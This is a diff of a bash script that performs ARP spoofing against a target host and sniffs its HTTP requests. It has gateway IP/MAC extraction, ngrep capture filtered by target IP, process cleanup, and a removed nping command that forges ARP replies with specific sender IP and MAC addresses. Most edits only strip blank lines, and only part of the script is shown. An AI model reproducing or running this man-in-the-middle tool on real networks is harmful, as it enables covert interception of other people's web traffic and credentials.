@@ -29,7 +29,6 @@ if [ $? -ne 0 ]; then
 fi
 
 
-
 extracting_ip_and_mac() {
 
 gateway_ip=$(route -n | awk -F " " {'print $2'} | grep -iE "\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}\b" | grep -v "0.0.0.0")
@@ -63,7 +62,6 @@ fi
 }
 
 # 😈
-
 restoring() {
 
 kill -9 $GET_PID_First
@@ -85,7 +83,6 @@ if [ $? -ne 0 ];then
 fi
 
 }
-
 
 
 spoofing() {
@@ -112,9 +109,6 @@ fi
 
 ngrep -q '^GET /|POST /|HEAD /| PUT /| OPTIONS /| DELETE /| PATCH .* HTTP/1.1' host ${target_ip} -W byline & ngrep_pid=$! 
 
-# ngrep -q '^GET /|POST /|HEAD /| PUT /| OPTIONS /| DELETE /| PATCH .* HTTP/1.1' -W byline & ngrep_pid=$! 
-
-
 if [ $? -ne 0 ];then
     echo "${red}{-} Ngrep not running Properly 😵‍💫${clear}"
     exit 0
@@ -127,8 +121,5 @@ restoring
 
 }
 
-
 extracting_ip_and_mac
 spoofing
-
-# nping --arp --arp-type ARP-reply --arp-sender-ip 192.168.204.2 --arp-sender-mac "00:0c:29:c3:2a:bd" --dest-mac "00:0c:29:f0:e7:f5" 192.168.204.135 -c 99999 --quiet & GET_PID_First=$!
